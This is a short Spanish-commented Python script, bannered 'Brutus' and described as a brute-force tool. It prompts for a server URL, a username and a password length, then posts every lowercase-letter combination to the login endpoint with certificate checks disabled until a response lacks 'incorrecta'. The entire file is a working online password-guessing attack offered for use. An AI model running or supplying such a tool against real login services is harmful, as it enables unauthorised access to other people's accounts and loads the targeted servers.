import requests
import json
import itertools

#variables
Minusculas = 'abcdefghijklmnopqrstuvwxyz'
Mayusculas = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
Numeros = 123456789
#Especiales !"#$%&/()=?¡*_:,;.-'¿
#variables de coneccion
def cabeceraElec():
	eleccionCabecera = int(input('selec: '))
	if eleccionCabecera == 1:
		return {'Content-Type': 'application/json'}
	else:
		return {'content-type': 'application/x-form-urlencoded','Accept': 'text/plain'}


def brutus(url, cabecera, usuario, longitud ):
#este es un array que contiene todas las combinaciones de contraseñas generadas para probar en la conexion
	combinaciones = itertools.product(arreglodecaracteres , repeat=longitud)
	#por cada combinacion se realiza una conexion donde password es igual a la combinacion
	
	for combinacion in combinaciones:
		password = ''.join(combinacion)
		payload = {'user': usuario , 'pass': password} 
		r = requests.post(url, data=json.dumps(payload),headers=cabecera, verify=False)
		respuesta = r.text
		if 'incorrecta' in respuesta:
		    print('contraseña incorrecta: '+password)
		else:
		    print('---------------------CONTRASEÑA ENCONTRADA-----------------------')
		    print('La contraseña es: ' + password)
		    break
 


#pograma


print('          .########..########..##.....##.########.##.....##..######.')
print('          .##.....##.##.....##.##.....##....##....##.....##.##....##')
print('          .##.....##.##.....##.##.....##....##....##.....##.##......')
print('          .########..########..##.....##....##....##.....##..######.')
print('          .##.....##.##...##...##.....##....##....##.....##.......##')
print('          .##.....##.##....##..##.....##....##....##.....##.##....##')
print('          .########..##.....##..#######.....##.....#######...######.')
print('                          Herramienta de Fuerza Bruta')
print('                                                                      ')
print('                                by kender perez')
url = input('coloca la url del servidor: ')
usuario = str(input('elige un nombre de usuario:'))
print('===========================elige el tipo de cabecera============================')
print('[1] para json')
print('[2] para urlencode')
cabecera = cabeceraElec()
print(f'cabecera seleccionada: {cabecera}')

#generar contraseña
longitud = int(input('introduce la longitud de la contaseña:'))
arreglodecaracteres = list(Minusculas)

brutus(url, cabecera, usuario, longitud)
